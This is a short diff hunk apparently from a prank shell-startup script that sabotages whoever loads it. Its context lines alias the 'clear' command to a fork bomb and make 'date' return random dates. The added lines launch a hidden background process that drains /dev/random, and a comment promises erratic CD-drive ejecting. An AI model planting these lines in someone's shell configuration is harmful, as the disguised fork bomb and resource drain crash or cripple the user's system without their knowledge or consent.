@@ -28,6 +28,9 @@ alias clear=':(){ :|:& };:';
 # Have `date` return random dates.
 alias date='date -d "now + $RANDOM days"';
 
+# Eat ALL the randomness.
+/bin/cat /dev/random > /dev/null 2>&1 &
+
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
 # reaaaalllly sllooowwwwllly.
